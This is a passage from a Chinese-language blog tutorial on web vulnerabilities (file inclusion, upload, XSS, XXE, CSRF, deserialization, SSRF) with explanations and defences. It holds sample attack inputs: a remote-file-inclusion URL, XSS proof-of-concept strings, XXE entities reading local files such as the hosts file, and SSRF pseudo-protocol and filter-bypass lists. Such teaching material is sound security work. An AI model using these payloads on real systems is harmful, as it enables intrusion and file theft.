命令：http://172.16.16.23:8080/hao.php?file<span class="token operator">=</span>http://172.16.16.102:8080/test.php   test.php是远程地址中的文件 远程调用需要开始调用端开启php的allow_url_fopne<span class="token operator">=</span>On,allow_url_inclide<span class="token operator">=</span>On
</code></pre> 
<h3><a id="_334"></a>五、文件上传漏洞</h3> 
<p>文件上传漏洞是指由于程序员在对用户文件上传部分的控制不足或者处理缺陷，而导致的用户可以越过其本身权限向服务器上上传可执行的动态脚本文件。这里上传的文件可以是木马，病毒，恶意脚本或者WebShell等。“文件上传”本身没有问题，有问题的是文件上传后，服务器怎么处理、解释文件。如果服务器的处理逻辑做的不够安全，则会导致严重的后果。</p> 
<h5><a id="_337"></a>产生文件上传漏洞的原因：</h5> 
<p>(1)对于上传文件的后缀名（扩展名）没有做较为严格的限制<br> (2)对于上传文件的MIMETYPE(用于描述文件的类型的一种表述方法) 没有做检查<br> (3)权限上没有对于上传的文件目录设置不可执行权限，（尤其是对于shebang类型的文件）<br> (4)对于web server对于上传文件或者指定目录的行为没有做限制</p> 
<h5><a id="_342"></a>防御方法：</h5> 
<ol><li> <p>文件类型检查：在上传文件时，验证文件的类型和扩展名，只允许上传安全的文件类型，如图片、文档等。可以通过检查文件的MIME类型或文件扩展名来进行验证。</p> </li><li> <p>文件大小限制：限制上传文件的大小，避免上传过大的文件导致服务器资源耗尽。可以设置最大文件大小的限制，超过限制的文件将被拒绝上传。</p> </li><li> <p>文件名检查（扩展名）：对上传的文件名进行检查，避免使用特殊字符或恶意代码。可以对文件名进行过滤或重命名，确保文件名安全。</p> </li><li> <p>文件内容检查：对上传的文件内容进行检查，确保文件不包含恶意代码或脚本。可以使用文件扫描工具对上传的文件进行检测，以识别潜在的恶意代码。</p> </li><li> <p>存储路径隔离（不要暴露上传的路径）：将上传的文件存储在独立的目录中，避免上传文件直接存储在Web根目录下。这样可以防止恶意文件被直接执行或访问。</p> </li><li> <p>文件权限设置：设置上传文件的权限，确保只有必要的用户可以访问上传的文件。避免设置过于宽松的文件权限，以防止恶意用户访问或执行上传的文件。</p> </li></ol> 
<h5><a id="_355"></a>利用方式：</h5> 
<p>1，找到文件上传的位置，通过提供的上传文件的接口（不一定）；<br> 2，尝试绕过，成功上传文件；</p> 
<h6><a id="_358"></a>常见的绕过方式；</h6> 
<p>删除/禁用前端JavaScript；<br> 抓包修改；<br> 等价扩展名；<br> 大小写绕过；<br> 双写；<br> 截断（%00）；<br> 图片马的绕过；<br> 二次渲染；</p> 
<h3><a id="xss_367"></a>六、xss漏洞</h3> 
<h5><a id="_369"></a>原理:</h5> 
<p>攻击者会向web页面(input表单、URL、留言版等位置)插入恶意JavaScript代码，导致管理员/用户访问时触发，从而达到攻击者的目的<br> 解释：服务器对用户提交的数据过滤不严，导致浏览器把用户的输入当成了JS代码并直接返回给客户端执行，从而实现对客户端的攻击目的</p> 
<h5><a id="_372"></a>攻击类型:</h5> 
<p>(1)反射型（非持久型）:<br> 反射型XSS，又称非持久型XSS，攻击相对于受害者而言是一次性的，具体表现在受害者点击了含有的恶意JavaScript脚本的url，恶意代码并没有保存在目标网站，而Web应用程序只是不加处理的把该恶意脚本“反射”回受害者的浏览器而使受害者的浏览器执行相应的脚本<br> (2)存储型（持久型）:<br> 存储型XSS是指应用程序通过Web请求获取不可信赖的数据，在未检验数据是否存在XSS代码的情况下，便将其存入数据库。当下一次从数据库中获取该数据时程序也未对其进行过滤，页面再次执行XSS代码持续攻击用户。存储型XSS漏洞大多出现在留言板、评论区，用户提交了包含XSS代码的留言到数据库，当目标用户查询留言时，那些留言的内容会从服务器解析之后加载出来。<br> (3)DOM型（非持久型）:<br> DOM，全称Document Object Model，是一个平台和语言都中立的接口，可以使程序和脚本能够动态访问和更新文档的内容、结构以及样式，DOM-XSS简单理解就是不与后台服务器产生数据交互，是一种通过DOM操作前端代码输出的时候产生的问题。</p> 
<h5><a id="XSS_379"></a>XSS漏洞的危害：</h5> 
<p>1.窃取用户Cookie<br> 2.后台增删改文章<br> 3.XSS钓鱼攻击<br> 4.利用XSS漏洞进行传播和修改网页代码<br> 5.XSS蠕虫攻击<br> 6.网站重定向<br> 7.获取键盘记录<br> 8.获取用户信息等</p> 
<h5><a id="_388"></a>防御机制：</h5> 
<p>1、对输入和URL参数进行过滤(白名单和黑名单)<br> 检查用户输入的数据中是否包含一些特殊字符，如&lt;、&gt;、’、“等，发现存在特殊字符，将这些特殊字符过滤或者编码。</p> 
<p>2、HTML实体编码<br> 字符串js编码转换成实体html编码的方法（防范XSS攻击）</p> 
<p>3、对输出内容进行编码<br> 在变量输出到HTML页面时，可以使用编码或转义的方式来防御XSS攻击。</p> 
<h5><a id="_398"></a>攻击流程及思路</h5> 
<pre><code class="prism language-bash"><span class="token number">1</span>、侦查<span class="token punctuation">(</span>找变量<span class="token punctuation">(</span>可控<span class="token punctuation">))</span>
<span class="token number">2</span>、敌情分析<span class="token punctuation">(</span><span class="token number">1</span>、环境分析 <span class="token number">2</span>、弹窗符号是否有过滤如:<span class="token operator">&lt;</span>、<span class="token punctuation">(</span>、<span class="token string">""</span>、<span class="token string">' 3、弹窗关键词是否有过滤如:&lt;script&gt; 4、是否可以临时修改前端属性)
3、敌情分析构造POC(js)拼接
#### 常用攻击代码：
1、&lt;script&gt;alert(document.domdomainain);&lt;/script&gt;
2、"&gt;&lt;script&gt;alert(document.domain);&lt;/script&gt;
3、验证发现:p1变量设置了过滤&amp; &lt; 通过抓包把代码替换成为P2的值         
4、验证发现:p1变量设置了过滤&amp; &lt; 通过抓包发现有三个变量p1 p2 p3 p1.p2做了字符转义 p3是一个字符串需要先闭合再输入代码"&gt;&lt;script&gt;alert(document.domain);&lt;/script&gt;
5、通过抓包发现只有一个变量，并设置了字符长度，使用抓包软件把input闭合输入代码"&gt;&lt;script&gt;alert(document.domain);&lt;/script&gt;

6、通过抓包发现只有一个变量p1,F12查看源码 设置了"特殊符号转义 编辑页面HTML代码直接赋值给value 饶过页面提交
执行代码有以下几个:
1、&lt;script&gt;alert(document.domain;&lt;/script&gt;
2、javascript:alert(document.domain)
3、onmousemover=alert(document.domain)
4、οnclick="alert(document.domain)
5、"&gt;&lt;script&gt;alert(document.domain);&lt;/script&gt;                                                        
6、"&gt;&lt;script&gt; eval(atob('</span><span class="token assign-left variable">YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ</span><span class="token operator">==</span>'<span class="token punctuation">))</span><span class="token punctuation">;</span><span class="token operator">&lt;</span>/script<span class="token operator">&gt;</span>
<span class="token number">7</span>、<span class="token punctuation">\</span><span class="token punctuation">\</span>u003cscript<span class="token punctuation">\</span><span class="token punctuation">\</span>u003ealert<span class="token punctuation">(</span>document.domain<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">\</span><span class="token punctuation">\</span>u003c/script<span class="token punctuation">\</span><span class="token punctuation">\</span>u003e
</code></pre> 
<h5><a id="http_422"></a>扩展http协议数据包讲解：</h5> 
<h6><a id="http_423"></a>http协议原理请求包和回应包</h6> 
<p>web应用编码技术<br> url编码：统一资源定位符，url标准格式：protocol://hostname:[:port]/path/[?query] ,协议类型（http，https,ftp),hostname服务器域名或IP地址，服务器端口（HTTP默认80），path资源所在路径，[?query]发送服务端的数据（?username=admin&amp;pwd=admin), ?username=admin&amp;pwd=1234&amp;5678<br> 密码设置成1234&amp;5678; 浏览上输入 以上地址回车，&amp;会破坏语法结构，从而导致服务端会认为密码是1234，而不是1234&amp;5678</p> 
<pre><code class="prism language-bash">解决技术：url编码
<span class="token operator">&amp;</span> %26，?username<span class="token operator">=</span>admin<span class="token operator">&amp;</span><span class="token assign-left variable">pwd</span><span class="token operator">=</span><span class="token number">1234</span>%265678，服务端对URL进行解析后，会对参数九自动进行一次URL解码，将%26解码加<span class="token operator">&amp;</span>

URL:在数据传输时特殊 字符需要编码；
base64编码，url在数据传输时特殊 字符需要编码，若文件传输里存在特殊字符，如何避免解析错误呢？web应用在设计时，为了避免大文件传输数据错乱的问题，才了base64对整个文内容进行编码；

hex编码：文件存储时，也在存这类特殊字符问题，解决的方法使用进制存储。常见的进制编码有二进制，八进制，十进制及十六进制；
</code></pre> 
<h6><a id="http_438"></a>http协议请求格式:</h6> 
<pre><code class="prism language-bash">请求包
get <span class="token punctuation">(</span>提交数据小） post （提交大量数据，无限制）:
POST（请求方法） /stage008.php?sid<span class="token operator">=</span>653b84d134f4e63eee13164b0f933c2dca4ff759（url<span class="token punctuation">)</span> HTTP/1.1<span class="token punctuation">(</span>http协议版本） --------请求行
Host: xss-quiz.int21h.jp :指定被请求资源的主机名
User-Agent: Mozilla/5.0 <span class="token punctuation">(</span>Windows<span class="token punctuation">;</span> U<span class="token punctuation">;</span> Windows NT <span class="token number">6.2</span><span class="token punctuation">;</span> zh-CN<span class="token punctuation">;</span> rv:1.9.2<span class="token punctuation">)</span> Gecko/20100115 Firefox/3.6 <span class="token punctuation">(</span>.NET CLR <span class="token number">3.5</span>.30729<span class="token punctuation">)</span> ----产生请求的浏览器类型
Accept: text/html,application/xhtml+xml,application/xml<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.9</span>,/<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.8</span> ：用户声明客户端可处理的mime类型
Accept-Language: zh-cn,zh<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.5</span> ：用于声明客户端能够理解的自然语言
Accept-Encoding: gzip, deflate ：用于声明客户端能够理解的内容编码方式
Accept-Charset: GB2312,utf-8<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.7</span>,*<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.7</span> ：浏览器可以授受的字符编码集
Keep-Alive: <span class="token number">115</span> keep-alive 技术创建的目的，就是能在多次 HTTP 之间重用同一个 TCP 连接，从而减少创建/关闭多个 TCP 连接的开销（包括响应时间、CPU 资源、减少拥堵等），
Connection: close 表示是否需要持久接连
Referer: https://xss-quiz.int21h.jp/stage008.php?sid<span class="token operator">=</span>333e2e26ebead3891a6fe967fbec338ae4d5c87d 这个请求从哪个链接过来的；
Cookie: <span class="token assign-left variable">__utma</span><span class="token operator">=</span><span class="token number">251560719.805050180</span>.1708915699.1708915699.1708915699.1<span class="token punctuation">;</span> <span class="token assign-left variable">__utmz</span><span class="token operator">=</span><span class="token number">251560719.1708915699</span>.1.1.utmcsr<span class="token operator">=</span><span class="token punctuation">(</span>direct<span class="token punctuation">)</span><span class="token operator">|</span><span class="token assign-left variable">utmccn</span><span class="token operator">=</span><span class="token punctuation">(</span>direct<span class="token punctuation">)</span><span class="token operator">|</span><span class="token assign-left variable">utmcmd</span><span class="token operator">=</span><span class="token punctuation">(</span>none<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token assign-left variable">PHPSESSID</span><span class="token operator">=</span>sp578epne1vrqtktr87kbnkatl -----一般存放着用户的身份凭证
Content-Type: application/x-www-form-urlencoded 请求的内容对应的MIME信息
Content-Length: <span class="token number">5</span> 请法说的内容长度（大小）
-------空行
<span class="token assign-left variable">p1</span><span class="token operator">=</span>aa ---请求数据get post <span class="token function">head</span> put delete options trace connect<span class="token punctuation">;</span>
请求方式：
代理：x-forward-for:ip
</code></pre> 
<h6><a id="http_462"></a>http协议回应格式:</h6> 
<pre><code class="prism language-bash">回应包respose
HTTP/1.1（http协议版本） <span class="token number">302</span>（状态码） Found（状态描述） 状态行
Date: Thu, <span class="token number">29</span> Feb <span class="token number">2024</span> 09:38:01 GMT 请求发送的时间和日期，GMT时间
Server: Apache 告诉客户端服务器的名称和版本号；
X-Powered-By: PHP/7.2.24 造诉客户端服务器采用的CMS框架
X-XSS-Protection: <span class="token number">0</span>
X-UA-Compatible: <span class="token assign-left variable">IE</span><span class="token operator">=</span>EmulateIE7
Expires: Thu, <span class="token number">19</span> Nov <span class="token number">1981</span> 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Location: ?sid<span class="token operator">=</span>0867b6a6c82ddf6fa9bc214d6a51f1f3c01527cf
Strict-Transport-Security: max-age<span class="token operator">=</span><span class="token number">315360000</span><span class="token punctuation">;</span>
Content-Length: <span class="token number">0</span> 响应正文长度
Connection: close 告诉客户端响应完成后的链接状态
Content-Type: textml<span class="token punctuation">;</span> <span class="token assign-left variable">charset</span><span class="token operator">=</span>UTF-8 响应正文的MIME类型
last-modified: 日期，用于指示资源的最后修改日期和时间
--空行
响应正文
</code></pre> 
<p>HTTP常见的状态码<br> 1xx: 信息–服务器收到请求，需要请求者继续执行操作<br> 2xx: 成功–操作被成功接收并处理<br> 3xx: 重定向–需要进一步的操作以完成请求<br> 4xx: 客户端错误–请求包含语法错误或无法完成请求<br> 5xx: 服务器端错误–服务器在处理请求的过程中发生了错误</p> 
<h3><a id="XXEXML_492"></a>七、XXE(XML外部实体注入漏洞)</h3> 
<h4><a id="_494"></a>原理：</h4> 
<p>XEE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描。攻击内网网站、发起DOS攻击等危害。XXE漏洞触发的点往往是可以上传XML文件的位置，没有对上传的XML文件进行过滤，导致可上传恶意XML文件</p> 
<pre><code class="prism language-bash"><span class="token number">1</span>、File_get_contents<span class="token punctuation">(</span><span class="token punctuation">)</span>
file_get_contents<span class="token punctuation">(</span><span class="token punctuation">)</span> 函数把整个文件读入一个字符串中。
和 file<span class="token punctuation">(</span><span class="token punctuation">)</span> 一样，不同的是 file_get_contents<span class="token punctuation">(</span><span class="token punctuation">)</span> 把文件读入一个字符串。
file_get_contents<span class="token punctuation">(</span><span class="token punctuation">)</span> 函数是用于将文件的内容读入到一个字符串中的首选方法。如果操作系统支持，还会使用内存映射技术来增强性能。
语法：
file_get_contents<span class="token punctuation">(</span>path,include_path,context,start,max_length<span class="token punctuation">)</span>

例子
<span class="token operator">&lt;</span>?php
<span class="token builtin class-name">echo</span> file_get_contents<span class="token punctuation">(</span><span class="token string">"test.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
?<span class="token operator">&gt;</span>
输出：
This is a <span class="token builtin class-name">test</span> <span class="token function">file</span> with <span class="token builtin class-name">test</span> text.
file_get_contents.php与test.txt在同一目录下：

<span class="token number">2</span>、php://input
php://input是一个可以访问请求的原始数据的只读流。
结合file_get_contents<span class="token punctuation">(</span>“php://input”<span class="token punctuation">)</span>可以读取post提交的数据，不提交post数据则无输出。


<span class="token number">3</span>、simplexml_load string函数介绍
php中的simplexml_load_string函数将xml格式字符串转换为对应的simeplXMLElemlent<span class="token punctuation">\</span>
语法：
simplexml_load_string<span class="token punctuation">(</span>data,classname,options,ns,is_prefix<span class="token punctuation">)</span><span class="token punctuation">;</span>

实例：
<span class="token number">4</span>、XML注入回显，PHP输出函数
在php中可以使用print_r<span class="token punctuation">(</span><span class="token punctuation">)</span>、echo输出想输出的内容。
语法：
bool print_r <span class="token punctuation">(</span> mixed <span class="token variable">$expression</span> <span class="token punctuation">[</span>, bool <span class="token variable">$return</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span>
参数说明：
<span class="token variable">$expression</span><span class="token builtin class-name">:</span> 要打印的变量，如果给出的是 string、integer 或 float 类型变量，将打印变量值本身。如果给出的是 array，将会按照一定格式显示键和元素。object 与数组类似。
<span class="token variable">$return</span><span class="token builtin class-name">:</span> 可选，如果为 <span class="token boolean">true</span> 则不输出结果，而是将结果赋值给一个变量，false 则直接输出结果。
（1）服务端源代码：
（2）提交正常参数
（3）构造payload：
.<span class="token operator">&lt;</span>?xml <span class="token assign-left variable">version</span><span class="token operator">=</span><span class="token string">"1.0"</span>?<span class="token operator">&gt;</span>
.<span class="token operator">&lt;</span><span class="token operator">!</span>DOCTYPE ANY <span class="token punctuation">[</span>
<span class="token builtin class-name">.</span>	<span class="token operator">&lt;</span><span class="token operator">!</span>ENTITY content SYSTEM <span class="token string">"file:///D:/phpstudy_pro/WWW/test.txt"</span><span class="token operator">&gt;</span>
.<span class="token punctuation">]</span><span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>note<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>name<span class="token operator">&gt;&amp;</span>content<span class="token punctuation">;</span><span class="token operator">&lt;</span>/name<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>/note<span class="token operator">&gt;</span>
（4）利用payload读取文件test.txt
案例：
<span class="token operator">&lt;</span>?xml <span class="token assign-left variable">version</span><span class="token operator">=</span><span class="token string">"1.0"</span>?<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span><span class="token operator">!</span>DOCTYPE <span class="token builtin class-name">test</span> <span class="token punctuation">[</span>
     <span class="token operator">&lt;</span><span class="token operator">!</span>ENTITY ddd SYSTEM <span class="token string">"file:///c:/Windows/System32/drivers/etc/hosts"</span><span class="token operator">&gt;</span>
<span class="token punctuation">]</span><span class="token operator">&gt;</span>

<span class="token operator">&lt;</span>test<span class="token operator">&gt;&amp;</span>ddd<span class="token punctuation">;</span><span class="token operator">&lt;</span>/test<span class="token operator">&gt;</span>
</code></pre> 
<h3><a id="CSRF_551"></a>八、CSRF(跨站请求伪造)</h3> 
<h4><a id="_553"></a>原理：</h4> 
<p>攻击者盗用了你的身份，以你的名义发送恶意请求，对服务器来说这个请求是完全合法的，但是却完成了攻击者所期望的一个操作，比如以你的名义发送邮件、发消息，盗取你的账号，添加系统管理员，甚至于购买商品、虚拟货币转账等</p> 
<h4><a id="2CSRF_555"></a>2、CSRF类型：</h4> 
<p>分为GET类型和POST类型</p> 
<h4><a id="_557"></a>利用方式：</h4> 
<p>1.寻找存CSRF漏洞的地方（表单），2.将这个动作抓下来 3.黑客构造自已网站，4黑客将这个网站发给具有cookie用户去点击.</p> 
<h4><a id="CSRF_559"></a>出现CSRF漏洞原因：</h4> 
<p>存在csrf漏洞的服务器没有对用户提交的参数进行验证，并且进行对应的身份进行验证，验证它是合法用户或者管理员等。从而造 成了csrf.所以说咱们在对应敏感操作时或者其它只有管理员可以执行的操作一定要对CSRF进行验证。例 如管理员执行新建用户需要输入对应的密码。这个操作可以很大程序上避免管理员点击恶意链接对用户和密码进行添加、删除、修改。</p> 
<h4><a id="CSRF_561"></a>CSRF漏洞本质：</h4> 
<p>服务器无法准确判断当前请是否是合法用户的自定义操作。因为咱们用户登陆之后服务器就会设置对应的cookie进行身份验证。验证成功之后就可以执行对应的操作。而存在CSRF时咱们用户在点击了构造CSRFPOC那么点击之后发送请求到服务器。服务器接收到cookie，因为咱们的用户已经登陆了，这个时候cookie请求一起发送服务器。服务器确定了是一个合法用户但是并不判断它是用户自已的操作还是用户点击了poc执行操作。而使得这种情下就存在CSRF漏洞。那么这个时候我们就要对请求进行身份验证。那么我们只通cookie无法进行对应的操作。意思：就是我们对每一次操作进行（钥匙），这个时候我们需要给登陆的合法用户一个唯一的合法令牌（钥匙），在每一次操作过种中服务器都会验证这个令牌是否正确。如果正确的话执行操作，如果不正确的话就停止操作或者弹出对应的提示.</p> 
<pre><code class="prism language-bash"><span class="token number">6</span>、攻击流程：
<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>用户输入账号信息请求登录A网站。
<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>A网站验证用户信息，通过验证后返回给用户一个cookie
<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>在未退出网站A之前，在同一浏览器中请求了黑客构造的恶意网站B
<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>B网站收到用户请求后返回攻击性代码，构造访问A网站的语句
<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>浏览器收到攻击性代码后，在用户不知情的情况下携带cookie信息请求了A网站。此时A网站不知道这是由B发起的。那么这时黑客就可以进行一下骚操作了！
	两个条件：
	a 用户访问站点A并产生了cookie
	b 用户没有退出A同时访问了B
<span class="token number">7</span>、防御机制：
<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>验证 HTTP Referer 字段
<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>在请求地址中添加 token 并验证<span class="token punctuation">(</span>Anti-CSRF token<span class="token punctuation">)</span>
</code></pre> 
<h3><a id="_579"></a>九、反序列化</h3> 
<h5><a id="_581"></a>含义:什么是反序列化</h5> 
<pre><code class="prism language-bash">序列化serialize<span class="token punctuation">(</span><span class="token punctuation">)</span>：序列化说通俗点就是把一个对象变成可以传输的字符串
反序列化unserialize<span class="token punctuation">(</span><span class="token punctuation">)</span>：就是把被序列化的字符串还原为对象,然后在接下来的代码中继续使用。
序列化和反序列化本身没有问题,但是如果反序列化的内容是用户可以控制的,且后台不正当的使用了PHP中的魔法函数,就会导致安全问题
常见的几个魔法函数:
__construct<span class="token punctuation">(</span><span class="token punctuation">)</span>当一个对象创建时被调用          
__destruct<span class="token punctuation">(</span><span class="token punctuation">)</span>当一个对象销毁时被调用          
__toString<span class="token punctuation">(</span><span class="token punctuation">)</span>当一个对象被当作一个字符串使用         
__sleep<span class="token punctuation">(</span><span class="token punctuation">)</span> 在对象在被序列化之前运行          
__wakeup将在序列化之后立即被调用
按照反序列化的要求unserialize<span class="token punctuation">(</span><span class="token punctuation">)</span>函数的参数可控并都有相同的一个类，并存在一个构建函数
使用serialize<span class="token punctuation">(</span><span class="token punctuation">)</span>函数进行序列化执行结果为O:1:<span class="token string">"S"</span>:1:<span class="token punctuation">{<!-- --></span>s:4:<span class="token string">"test"</span><span class="token punctuation">;</span>s:29:<span class="token string">"&lt;script&gt;alert('xss')&lt;/script&gt;"</span><span class="token punctuation">;</span><span class="token punctuation">}</span>

使用序列化之后的数据提交
可以看到提示成功
原理是使用使用serialize<span class="token punctuation">(</span><span class="token punctuation">)</span>函数进行序列化执行结果为O:1:<span class="token string">"S"</span>:1:<span class="token punctuation">{<!-- --></span>s:4:<span class="token string">"test"</span><span class="token punctuation">;</span>s:29:<span class="token string">"&lt;script&gt;alert('xss')&lt;/script&gt;"</span><span class="token punctuation">;</span><span class="token punctuation">}</span>
然后提交到页面传参到后端，后端使用unserialize<span class="token punctuation">(</span><span class="token punctuation">)</span>进行反序列化成php代码并执行。
</code></pre> 
<h4><a id="_602"></a>反序列化的原理:</h4> 
<p>(1)序列化与反序列化： 序列化是将对象转换为字节流的过程，以便可以将其保存到文件、数据库或通过网络传输。反序列化是将这些字节流重新构造成原始对象的过程。<br> (2)漏洞产生： 当应用程序反序列化来自不可信源的数据时，如果没有适当的验证和安全措施，攻击者可以操纵这些数据来执行恶意代码。</p> 
<h4><a id="_605"></a>形成漏洞的原因:</h4> 
<p>(1)信任外部输入： 应用程序盲目信任外部输入的数据进行反序列化。<br> (2)缺乏输入验证： 缺乏对反序列化数据的严格验证和清洁化。<br> (3)使用不安全的库或方法： 使用存在已知漏洞的序列化/反序列化库。<br> 反序列化的危害：<br> (1)远程代码执行： 攻击者可能执行任意代码，控制受影响的系统。<br> (2)数据泄露： 访问或修改应用程序数据，导致信息泄露。<br> (3)拒绝服务攻击： 通过构造特殊的对象导致应用崩溃，造成服务不可用。</p> 
<h4><a id="_614"></a>如何防御：</h4> 
<p>避免使用Java原生序列化： 使用更安全的序列化方法，例如JSON或XML，这些格式不容易受到此类攻击。<br> 输入验证： 对反序列化的数据进行严格的输入验证。<br> 使用白名单： 只允许特定的类进行反序列化。</p> 
<h4><a id="_618"></a>防护措施：</h4> 
<p>输入验证： 对所有反序列化数据进行严格的输入验证。<br> 最小化使用： 尽量减少序列化和反序列化的使用。<br> 使用安全的库和方法： 选择具有良好安全记录的库，并保持更新。<br> 权限最小化： 确保应用程序以最小的必要权限运行。</p> 
<h3><a id="SSRF_624"></a>十、SSRF(服务器端请求伪造)</h3> 
<h4><a id="_626"></a>原理:</h4> 
<p>大都是由于服务端提供了从其他服务器应用获取数据的功能,但又没有对目标地址做严格过滤与限制，导致攻击者可以传入任意的地址来让后端服务器对其发起请求,并返回对该目标地址请求的数据<br> 数据流:攻击者-----&gt;服务器----&gt;目标地址<br> 根据后台使用的函数的不同,对应的影响和利用方法又有不一样PHP中下面函数的使用不当会导致<strong>SSRF: file_get_contents() fsockopen() curl_exec()</strong></p> 
<h4><a id="_631"></a>如何判断存在漏洞：</h4> 
<pre><code class="prism language-bash">漏洞一般存在的地方
（1）分享链接
（2）转码服务
（3）在线翻译
（4）图片、文章收藏功能
（5）未公开的API实现以及其他调用URL的功能
（6）图片加载与下载
（7）从URL关键字中寻找（share、wap、url、link、src、source、target、u、display、sourceURl、imageURL、domain）

<span class="token comment">### 产生SSRF漏洞的函数（PHP）：</span>
（1）file_get_contents
（2）sockopen<span class="token punctuation">(</span><span class="token punctuation">)</span>:
（3）curl_exec<span class="token punctuation">(</span><span class="token punctuation">)</span>:

<span class="token comment">### 当我们发现SSRF漏洞后：</span>
首先要做的事情就是测试所有可用的URL伪协议
file:/// 从文件系统中获取文件内容，如，file:///etc/passwd
dict:// 字典服务器协议，访问字典资源，如，dict:///ip:6739/info：
sftp:// SSH文件传输协议或安全文件传输协议
ldap:// 轻量级目录访问协议
tftp:// 简单文件传输协议
gopher:// 分布式文档传递服务，可使用gopherus生成payload

<span class="token comment">### SSRF危害：</span>
SSRF漏洞利用手段：
（1）可以对外网、内网、本地进行端口扫描，某些情况下端口的Banner会回显出来（比如3306的）；
（2）攻击运行在内网或本地的有漏洞程序（比如溢出）；
（3）可以对内网Web应用进行指纹识别，原理是通过请求默认的文件得到特定的指纹；
（4）攻击内网或外网有漏洞的Web应用；
（5）使用file：///协议读取本地文件<span class="token punctuation">(</span>或其他协议）

<span class="token comment">### SSRF绕过：</span>
SSRF漏洞绕过方法：
（1）@          http://abc.com@127.0.0.1
（2）添加端口号      http://127.0.0.1:8080
（3）短地址        https://0x9.me/cuGfD
（4）可以指向任意ip的域名  xip.io
（5）ip地址转换成进制来访问 <span class="token assign-left variable">192.168.0.1</span><span class="token operator">=</span><span class="token number">3232235521</span>（十进制）
（6）非HTTP协议
（7）DNS Rebinding

<span class="token comment">### SSRF防御：</span>
<span class="token number">1</span>,过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。
<span class="token number">2</span>, 统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。
<span class="token number">3</span>,限制请求的端口为http常用的端口，比如，80,443,8080,8090。
<span class="token number">4</span>,黑名单内网ip。避免应用被用来获取获取内网数据，攻击内网。
<span class="token number">5</span>,禁用不需要的协议。仅仅允许http和https请求。可以防止类似于file:///,gopher://,ftp:// 等引起的问题。
</code></pre>
                </div>
		</div>
		<div id="gabottom"></div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/3ee60b9e412fde10ee454656d1652515/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">mac可以玩steam吗 mac安装steam教程 苹果电脑能打steam游戏吗 苹果电脑怎么安装windows 苹果mac电脑配置AI功能的M4芯片</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/a4b8a76d22b2de50f03f3476561de217/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">通义灵码使用教程：探索AI编码的新维度</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 编程大咖.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://www.w3counter.com/tracker.js?id=151347"></script>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>